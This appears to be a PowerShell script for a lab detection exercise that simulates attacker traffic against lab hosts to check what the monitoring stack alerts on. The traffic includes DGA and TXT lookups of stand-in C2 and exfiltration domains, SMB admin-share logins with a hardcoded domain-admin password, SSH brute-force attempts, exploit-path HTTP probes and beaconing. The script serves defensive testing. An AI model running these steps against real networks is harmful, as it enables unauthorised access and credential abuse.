# CADRE — Branch E stream simulated attacks, executed FROM ws01 (beachhead) as analyst_t1
# Re-purposed from attack-matrix/04-automation/campaign-e/wt069-081.sh (originally provisioning/linux01)
# Runs the attack side only; detection is verified in the telemetry stage (monitor .55).
$ErrorActionPreference = 'Continue'
$DC01 = '192.168.77.10'
$DC02 = '192.168.77.11'
$DC03 = '192.168.77.12'
$MBR01 = '192.168.77.22'
$MBR02 = '192.168.77.23'
$LINUX01 = '192.168.77.40'
$ELK = '192.168.77.50'
$log = 'C:\Users\analyst_t1\campaign-e-results.txt'
"=== Branch E attack sims from ws01 ($(Get-Date -Format o)) ===" | Set-Content $log

function Step($m) { Write-Output $m; Add-Content $log $m }
function Done($m) { Write-Output $m; Add-Content $log $m }

# --- WT069 DNS DGA (E-04) ---
Step '[WT069] DNS DGA: 25 random + 15 high-entropy queries'
1..25 | ForEach-Object {
  $l = -join ((97..122)+(48..57) | Get-Random -Count 12 | ForEach-Object {[char]$_})
  nslookup "$l.example.com" $DC01 2>$null | Out-Null
}
1..15 | ForEach-Object {
  $l = -join ((97..122)+(48..57) | Get-Random -Count 16 | ForEach-Object {[char]$_})
  nslookup "$l.malware-c2.evil" $DC02 2>$null | Out-Null
}
Done '  -> done'

# --- WT070 DNS TXT (E-05) ---
Step '[WT070] DNS TXT queries (legit + evil)'
foreach ($d in 'google.com','example.com','github.com','outlook.com','yahoo.com','cloudflare.com','amazon.com','microsoft.com','facebook.com','twitter.com') {
  nslookup -type=TXT $d $DC01 2>$null | Out-Null
}
foreach ($s in 'exfil','data','beacon','c2','tunnel') {
  nslookup -type=TXT "$s.evil-domain.tk" $DC02 2>$null | Out-Null
}
Done '  -> done'

# --- WT071 DNS NXDOMAIN burst (E-06) ---
Step '[WT071] DNS NXDOMAIN burst: 30 queries'
1..30 | ForEach-Object {
  nslookup "nonexistent-host-$([guid]::NewGuid().ToString('N').Substring(0,8)).badtld" $DC01 2>$null | Out-Null
}
Done '  -> done'

# --- WT072 DNS suspicious TLD (E-07) ---
Step '[WT072] DNS suspicious TLDs (.tk .ml .ga .cf .gq)'
foreach ($tld in 'tk','ml','ga','cf','gq') {
  nslookup "test-domain.$tld" $DC01 2>$null | Out-Null
  nslookup "malware-c2.$tld" $DC01 2>$null | Out-Null
  nslookup "data-exfil.$tld" $DC01 2>$null | Out-Null
}
Done '  -> done'

# --- WT073 DNS IP literal / PTR (E-08) ---
Step '[WT073] DNS IP-literal PTR lookups'
foreach ($ip in '8.8.8.8','192.168.77.10','10.0.0.1','172.16.0.1') {
  nslookup -type=PTR "$ip.in-addr.arpa" $DC01 2>$null | Out-Null
}
Done '  -> done'

# --- WT074 TLS 1.0 ClientHello (E-09) ---
Step '[WT074] TLS 1.0 connections (ClientHello toward 443 listeners)'
curl.exe -k --tlsv1.0 --max-time 5 https://$DC01/ 2>&1 | Out-Null
curl.exe -k --tlsv1.0 --max-time 5 https://$DC02/ 2>&1 | Out-Null
curl.exe -k --tlsv1.0 --max-time 5 https://$MBR02/ 2>&1 | Out-Null
Done '  -> done'

# --- WT075 SMB admin share (E-12) ---
Step '[WT075] SMB admin share access (C$/ADMIN$ on DC01) as Cadre\chief_command'
net use "\\$DC01\C$" /user:Cadre\chief_command 'C0mm@nd_Ch1ef!' 2>&1 | Out-Null
$c = net use 2>$null | Select-String "\\$DC01"
if ($c) { net use "\\$DC01\C$" 2>&1 | Out-Null; Done '  -> C$ connected (cross-forest DA)'; net use "\\$DC01\C$" /delete 2>&1 | Out-Null }
else { Done '  -> C$ connect failed (note)'; net use "\\$DC01\C$" /delete 2>&1 | Out-Null }
net use "\\$DC01\ADMIN$" /user:Cadre\chief_command 'C0mm@nd_Ch1ef!' 2>&1 | Out-Null
$c2 = net use 2>$null | Select-String "\\$DC01"
if ($c2) { Done '  -> ADMIN$ connected'; net use "\\$DC01\ADMIN$" /delete 2>&1 | Out-Null }
else { Done '  -> ADMIN$ connect failed (note)' }

# --- WT076 HTTP suspicious UA (E-14) ---
Step '[WT076] HTTP suspicious User-Agents'
foreach ($ua in 'curl/7.68.0','Wget/1.21','Python-urllib/3.9','Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041') {
  curl.exe -A "$ua" -o NUL -s -w '' "http://$MBR02/" 2>$null | Out-Null
}
Done '  -> done'

# --- WT077 HTTP exploit path ---
Step '[WT077] HTTP exploit paths (cmd.exe / powershell / wget / nc / curl)'
foreach ($p in 'cmd.exe','powershell','wget','nc','curl') {
  curl.exe -o NUL -s "http://$MBR02/$p" 2>$null | Out-Null
}
Done '  -> done'

# --- WT078 HTTP suspicious Content-Type ---
Step '[WT078] HTTP POST with suspicious Content-Types'
curl.exe -X POST -H 'Content-Type: application/x-msdownload' -d 'FAKE_MALWARE_PAYLOAD' "http://$MBR02/" -o NUL -s 2>$null | Out-Null
curl.exe -X POST -H 'Content-Type: application/octet-stream' -d 'FAKE_BINARY_DATA' "http://$MBR02/" -o NUL -s 2>$null | Out-Null
Done '  -> done'

# --- WT079 SSH brute force (best-effort on Windows) ---
Step '[WT079] SSH brute force: 10 failed logins to linux01'
foreach ($pass in 'wrong1','wrong2','wrong3','wrong4','wrong5','wrong6','wrong7','wrong8','wrong9','wrong10') {
  $p = Start-Process ssh -ArgumentList '-o','StrictHostKeyChecking=no','-o','UserKnownHostsFile=NUL','-o','NumberOfPasswordPrompts=1','-o','PreferredAuthentications=password','-o','PubkeyAuthentication=no','-o','ConnectTimeout=3',"vagrant@$LINUX01",'exit' -NoNewWindow -PassThru -RedirectStandardInput NUL
  Start-Sleep -Milliseconds 300
}
Done '  -> done (verify handshakes reached linux01)'

# --- WT080 long connection / beacon ---
Step '[WT080] Long TCP connection to ELK:443 (beacon hold ~90s)'
try {
  $client = New-Object System.Net.Sockets.TcpClient
  $client.Connect($ELK, 443)
  $stream = $client.GetStream()
  $sw = [System.Diagnostics.Stopwatch]::StartNew()
  while ($sw.Elapsed.TotalSeconds -lt 90 -and $client.Connected) {
    try { $b = [byte[]](0x42); $stream.Write($b,0,1); $stream.Flush() } catch {}
    Start-Sleep -Seconds 10
  }
  $client.Close()
  Done '  -> 90s beacon connection done'
} catch { Done ('  -> connect failed: ' + $_.Exception.Message) }

# --- WT081 outbound anomaly (non-lab IPs) ---
Step '[WT081] Outbound connections to non-lab IPs (203.0.113.1 / 10.0.0.1 / 172.16.0.1)'
curl.exe -s --connect-timeout 3 http://203.0.113.1/ -o NUL 2>$null | Out-Null
curl.exe -s --connect-timeout 3 http://10.0.0.1/ -o NUL 2>$null | Out-Null
curl.exe -s --connect-timeout 3 http://172.16.0.1/ -o NUL 2>$null | Out-Null
Done '  -> done'

# --- E-10 SNI best-effort (custom SNI ClientHello to mbr02:443) ---
Step '[E-10] Custom-SNI TLS ClientHello (fake-sni.example.com -> mbr02)'
curl.exe -k --resolve fake-sni.example.com:443:$MBR02 --max-time 5 https://fake-sni.example.com/ -o NUL -s 2>$null | Out-Null
Done '  -> done'

Write-Output ''
Write-Output "=== Branch E attack sims complete. Results: $log ==="
